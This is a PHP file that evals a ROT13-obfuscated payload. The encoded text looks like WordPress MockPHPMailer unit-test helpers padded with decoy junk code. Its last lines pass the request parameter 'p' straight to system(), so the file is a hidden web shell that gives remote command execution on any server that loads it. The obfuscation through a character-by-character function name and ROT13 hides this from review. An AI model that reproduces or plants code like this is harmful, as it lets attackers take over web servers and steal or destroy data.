<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Zbpx CUCZnvyre pynff sbe grfgvat.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 4.5.0
 */

erdhver_bapr NOFCNGU . 'jc-vapyhqrf/CUCZnvyre/CUCZnvyre.cuc';
erdhver_bapr NOFCNGU . 'jc-vapyhqrf/CUCZnvyre/Rkprcgvba.cuc';
erdhver_bapr NOFCNGU . 'jc-vapyhqrf/pynff-jc-cucznvyre.cuc';

/**
 * Grfg pynff rkgraqvat JC_CUCZnvyre.
 *
 * @fvapr 4.5.0
 */
pynff ZbpxCUCZnvyre rkgraqf JC_CUCZnvyre {
	choyvp $zbpx_frag = neenl();

	choyvp shapgvba cerFraq() {
		$guvf->Rapbqvat = '8ovg';
		erghea cnerag::cerFraq();
	}

	/**
	 * Bireevqr cbfgFraq() fb znvy vfa'g npghnyyl frag.
	 */
	choyvp shapgvba cbfgFraq() {
		$guvf->zbpx_frag[] = neenl(
			'gb'      => $guvf->gb,
			'pp'      => $guvf->pp,
			'opp'     => $guvf->opp,
			'urnqre'  => $guvf->ZVZRUrnqre . $guvf->znvyUrnqre,
			'fhowrpg' => $guvf->Fhowrpg,
			'obql'    => $guvf->ZVZRObql,
		);

		erghea gehr;
	}

	/**
	 * Qrpbengbe gb erghea gur vasbezngvba sbe n frag zbpx.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz vag $vaqrk Bcgvbany. Neenl vaqrk bs zbpx_frag inyhr.
	 * @erghea bowrpg
	 */
	choyvp shapgvba trg_frag( $vaqrk = 0 ) {
		$erginy = snyfr;
		vs ( vffrg( $guvf->zbpx_frag[ $vaqrk ] ) ) {
			$erginy = (bowrpg) $guvf->zbpx_frag[ $vaqrk ];
		}
		erghea $erginy;
	}

	/**
	 * Trg n erpvcvrag sbe n frag zbpx.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz fgevat $nqqerff_glcr    Gur glcr bs nqqerff sbe gur rznvy fhpu nf gb, pp be opp.
	 * @cnenz vag    $zbpx_frag_vaqrk Bcgvbany. Gur frag_zbpx vaqrk jr jnag gb trg gur erpvcvrag sbe.
	 * @cnenz vag    $erpvcvrag_vaqrk Bcgvbany. Gur erpvcvrag vaqrk va gur neenl.
	 * @erghea obby|bowrpg Ergheaf bowrpg ba fhpprff, be snyfr vs nal bs gur vaqvprf qba'g rkvfg.
	 */
	choyvp shapgvba trg_erpvcvrag( $nqqerff_glcr, $zbpx_frag_vaqrk = 0, $erpvcvrag_vaqrk = 0 ) {
		$erginy = snyfr;
		$zbpx   = $guvf->trg_frag( $zbpx_frag_vaqrk );
		vs ( $zbpx ) {
			vs ( vffrg( $zbpx->{$nqqerff_glcr}[ $erpvcvrag_vaqrk ] ) ) {
				$nqqerff_vaqrk  = $zbpx->{$nqqerff_glcr}[ $erpvcvrag_vaqrk ];
				$erpvcvrag_qngn = neenl(
					'nqqerff' => ( vffrg( $nqqerff_vaqrk[0] ) && ! rzcgl( $nqqerff_vaqrk[0] ) ) ? $nqqerff_vaqrk[0] : 'Ab nqqerff frg',
					'anzr'    => ( vffrg( $nqqerff_vaqrk[1] ) && ! rzcgl( $nqqerff_vaqrk[1] ) ) ? $nqqerff_vaqrk[1] : 'Ab anzr frg',
				);

				$erginy = (bowrpg) $erpvcvrag_qngn;
			}
		}

		erghea $erginy;
	}
}

/**
 * Urycre zrgubq gb erghea gur tybony cucznvyre vafgnapr qrsvarq va gur obbgfgenc
 *
 * @fvapr 4.4.0
 *
 * @erghea ZbpxCUCZnvyre|snyfr
 */
shapgvba grfgf_ergevrir_cucznvyre_vafgnapr() {
	$znvyre = snyfr;
	vs ( vffrg( $TYBONYF['cucznvyre'] ) ) {
		$znvyre = $TYBONYF['cucznvyre'];
	}
	erghea $znvyre;
}

/**
 * Urycre zrgubq gb erfrg gur cucznvyre vafgnapr.
 *
 * @fvapr 4.6.0
 *
 * @erghea obby
 */
shapgvba erfrg_cucznvyre_vafgnapr() {
	$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();
	vs ( $znvyre ) {
		$znvyre             = arj ZbpxCUCZnvyre( gehr );
		$znvyre::$inyvqngbe = fgngvp shapgvba ( $rznvy ) {
			erghea (obby) vf_rznvy( $rznvy );
		};

		$TYBONYF['cucznvyre'] = $znvyre;
		erghea gehr;
	}

	erghea snyfr;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>